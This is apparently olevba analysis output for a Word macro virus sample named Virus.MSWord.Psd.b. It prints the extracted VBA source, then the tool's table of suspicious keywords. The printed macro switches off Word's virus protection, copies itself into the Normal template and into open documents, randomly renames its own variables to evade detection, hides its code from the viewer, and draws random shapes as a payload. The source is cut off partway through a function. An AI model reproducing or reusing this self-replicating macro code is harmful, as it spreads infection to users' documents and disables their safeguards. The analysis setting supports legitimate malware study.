olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-c8835a147bcffc90870fa726002e1c5fcf627929
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-c8835a147bcffc90870fa726002e1c5fcf627929 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For HU7320 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next HU7320: End If
UB5296 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
AQ238 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set MA718 = ActiveDocument.VBProject.VBComponents.Item(1)
CF354 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set MA718 = NormalTemplate.VBProject.VBComponents.Item(1)
GQ340 = True
Call DS3292_PL4028
ActiveDocument.Saved = True
End If
If GQ340 <> True And CF354 <> True Then GoTo HG7020
If GQ340 = True Then MA718.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, UB5296 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If CF354 = True Then MA718.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AQ238 - 4))
HG7020:
If AQ238 <> 0 And UB5296 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function DS3292_PL4028()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "LC8089": r1(2) = "OF9766": r1(3) = "QT3772": r1(4) = "CN3289": r1(5) = "PL4028": r1(6) = "UB5296"
r1(7) = "AQ238": r1(8) = "CF354":: r1(9) = "MA718": r1(10) = "GQ340": r1(11) = "HG7020": r1(12) = "DS3292": r1(13) = "MF5880": r1(14) = "ER8459": r1(15) = "HU7320"
For HU7320 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call PL4028(a1, r1(HU7320))
Next HU7320
End Function 'VAMP v1.0 [thanks Vic!]
Private Function PL4028(ER8459, MF5880 As String)
On Error Resume Next
Dim LC8089 As Long: Dim OF9766 As Long: Dim QT3772 As Long: Dim CN3289 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LC8089 = 1: OF9766 = 1: QT3772 = .CountOfLines: CN3289 = Len(.Lines(.CountOfLines, 1))
Do While .Find(MF5880, LC8089, OF9766, QT3772, CN3289, True)
strline = .Lines(LC8089, 1)
strline = Left(strline, OF9766 - 1) & ER8459 & Mid(strline, CN3289)
.replaceline LC8089, strline
LC8089 = QT3772 + 1: OF9766 = 1:
QT3772 = .CountOfLines
CN3289 = Len(.Lines(.CountOfLines, 1))
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

